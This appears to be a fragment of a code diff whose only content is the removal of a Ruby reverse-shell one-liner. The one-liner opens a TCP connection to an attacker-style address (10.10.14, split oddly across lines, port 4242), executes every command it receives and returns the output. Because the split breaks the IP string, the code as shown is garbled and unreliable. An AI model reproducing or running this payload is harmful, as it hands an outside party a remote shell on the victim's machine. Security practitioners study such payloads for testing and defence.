@@ -1,2 +1,0 @@
-ruby -rsocket -e'exit if fork;c=TCPSocket.new("10.10.14
-28","4242");loop{c.gets.chomp!;(exit! if $_=="exit");($_=~/cd (.+)/i?(Dir.chdir($1)):(IO.popen($_,?r){|io|c.print io.read}))rescue c.puts "failed: #{$_}"}'
